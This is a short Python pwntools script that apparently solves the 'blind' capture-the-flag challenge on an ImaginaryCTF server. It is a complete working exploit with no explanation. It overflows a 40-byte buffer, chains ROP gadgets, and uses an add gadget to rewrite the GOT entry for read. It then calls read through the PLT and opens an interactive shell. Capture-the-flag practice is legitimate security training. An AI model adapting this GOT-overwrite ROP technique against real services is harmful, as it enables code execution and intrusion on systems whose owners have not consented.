from pwn import *

r = remote("blind.chal.imaginaryctf.org" ,1337)
#r = process("./vuln")
e = ELF("./vuln")
gadget_1 = 0x00000000004011ca               # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
add_gadget = 0x000000000040111c             # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
exploit = b"A" * 40 + p64(gadget_1) + p64(0xfffd5b3e) + p64(e.got.read + 0x3d) + p64(0x0) * 4 + p64(add_gadget) + p64(e.plt.read)
r.send(exploit)
r.interactive()
